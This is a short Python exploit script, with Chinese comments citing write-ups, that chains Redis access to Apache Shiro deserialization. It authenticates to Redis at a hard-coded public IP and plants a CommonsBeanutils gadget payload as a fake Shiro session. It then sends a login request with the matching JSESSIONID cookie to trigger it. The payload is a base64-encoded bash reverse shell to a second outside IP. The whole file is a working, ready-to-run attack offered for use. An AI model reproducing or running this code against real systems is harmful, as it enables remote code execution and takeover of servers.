# redis未授权到shiro反序列化 https://xz.aliyun.com/t/11198
# https://mp.weixin.qq.com/s/V_GLnv2ZyPmI11z1__K5og
# 下面写入 shiro session key: test111, 登录时把 Cookie: JSESSIONID=xxx 改为 Cookie: JSESSIONID=test111
# 修改 pyyso.cb1v192 中的 base64 进行反弹shell
import pyyso
import socket

s = socket.socket()
s.connect(("103.108.67.223", 6379))
# 设置 Redis 密码
password = "abc123".encode()

# 发送 AUTH 命令进行密码认证
s.send(b"*2\r\n$4\r\nAUTH\r\n$" + str(len(password)).encode() + b"\r\n" + password + b"\r\n")

whatever = "test111"
key = "shiro:session:" + whatever
value = pyyso.cb1v192("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjc2LjE5Mi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}").decode('latin')
v1 = f"\x2a\x33\x0d\x0a\x24\x33\x0d\x0aSET\r\n\x24{len(key)}\r\n{key}\r\n\x24{len(value)}\r\n{value}\r\n".encode('latin')
s.send(v1)
# s.send(b"\x2a\x33\x0d\x0a\x24\x33\x0d\x0aSET\r\n\x24" + str(len(key)).encode() + b"\r\n" + key + b"\r\n\x24" + str(len(value)).encode() + b"\r\n" + value + b"\r\n")
if b"+OK" in s.recv(3):
    print("success")


def rev_shell():
    from requests_html import HTMLSession
    session = HTMLSession()
    url = 'http://103.108.67.223:8089/login'
    data = {'username': ['admin'], 'password': ['123456']}
    files = {}
    cookies = {"JSESSIONID": "test111"}
    r = session.post(url, data=data, files=files, cookies=cookies)
    print(r.text)


rev_shell()
